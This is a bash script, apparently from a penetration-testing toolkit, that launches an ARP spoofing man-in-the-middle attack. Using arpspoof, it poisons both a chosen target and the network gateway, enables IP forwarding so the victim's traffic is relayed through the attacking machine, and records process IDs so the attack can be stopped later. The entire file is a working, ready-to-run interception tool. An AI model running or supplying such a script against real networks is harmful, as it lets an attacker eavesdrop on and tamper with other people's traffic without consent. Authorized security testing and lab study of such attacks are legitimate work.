#!/usr/bin/env bash
# Start ARP spoofing: poison target and gateway so traffic flows through us.
# Usage: arp_spoof_start.sh <interface> <target_ip> <gateway_ip>
# Requires: arpspoof (dsniff), run as root.
set -euo pipefail

if [ "$#" -lt 3 ]; then
  echo "Usage: $0 <interface> <target_ip> <gateway_ip>" >&2
  exit 1
fi

IFACE="$1"
TARGET="$2"
GATEWAY="$3"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../../.." && pwd)"
REPORTS_DIR="$PROJECT_ROOT/reports/network_attacks"
PID_FILE="$REPORTS_DIR/.arp_spoof_pids"
mkdir -p "$REPORTS_DIR"

if ! command -v arpspoof >/dev/null 2>&1; then
  echo "arpspoof not found. Install dsniff: apt install dsniff" >&2
  exit 1
fi

# Stop any existing ARP spoof
[ -f "$PID_FILE" ] && while read -r pid; do kill -0 "$pid" 2>/dev/null && kill "$pid" 2>/dev/null; done < "$PID_FILE" || true
rm -f "$PID_FILE"

# Enable IP forwarding so we can relay traffic
echo 1 > /proc/sys/net/ipv4/ip_forward

# Bidirectional: target thinks we are gateway; gateway thinks we are target
arpspoof -i "$IFACE" -t "$TARGET" "$GATEWAY" >> "$REPORTS_DIR/arp_spoof.log" 2>&1 &
echo $! >> "$PID_FILE"
arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET" >> "$REPORTS_DIR/arp_spoof.log" 2>&1 &
echo $! >> "$PID_FILE"

echo "[+] ARP spoofing started (target=$TARGET, gateway=$GATEWAY on $IFACE). Run arp_spoof_stop.sh to stop."
